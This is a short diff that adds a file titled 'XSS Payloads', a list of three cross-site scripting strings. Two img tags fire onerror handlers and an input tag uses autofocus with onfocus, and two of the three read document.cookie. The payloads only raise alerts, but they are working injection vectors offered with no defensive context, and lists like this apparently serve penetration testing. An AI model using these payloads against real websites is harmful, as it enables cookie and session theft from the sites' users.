@@ -1,0 +1,6 @@
+XSS Payloads
+
+<img src='x' onerror='alert(1)'>
+<img src="" onerror="alert(document.cookie)" />
+
+<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>
